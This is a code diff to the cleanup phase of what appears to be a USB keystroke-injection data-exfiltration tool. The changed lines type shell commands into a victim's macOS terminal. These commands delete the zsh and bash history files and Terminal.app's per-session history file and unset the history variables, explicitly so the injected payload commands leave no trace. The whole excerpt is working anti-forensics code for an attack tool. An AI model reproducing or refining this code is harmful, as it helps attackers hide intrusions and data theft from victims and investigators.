@@ -509,11 +509,19 @@ static void phase_cleanup(HidExfilWorker* worker) {
          * `history -p` is csh/tcsh only — it does nothing in zsh (macOS
          * default since Catalina).  Without `unset HISTFILE`, zsh writes
          * the in-memory history (including payload commands) to a new
-         * ~/.zsh_history on exit, defeating the cleanup. */
+         * ~/.zsh_history on exit, defeating the cleanup.
+         * Terminal.app also saves per-session history via a precmd hook
+         * in /etc/zshrc_Apple_Terminal to ~/.zsh_sessions/*.history.
+         * Removing $SHELL_SESSION_FILE and unsetting it prevents that. */
         furi_delay_ms(300);
         type_string("rm -f ~/.zsh_history ~/.bash_history\r\n", delay, worker);
         furi_delay_ms(200);
-        type_string("unset HISTFILE\r\n", delay, worker);
+        type_string(
+            "[ -n \"$SHELL_SESSION_FILE\" ] && rm -f \"$SHELL_SESSION_FILE\" 2>/dev/null\r\n",
+            delay,
+            worker);
+        furi_delay_ms(200);
+        type_string("unset HISTFILE SHELL_SESSION_FILE\r\n", delay, worker);
         furi_delay_ms(200);
         type_string("exit\r\n", delay, worker);
         break;
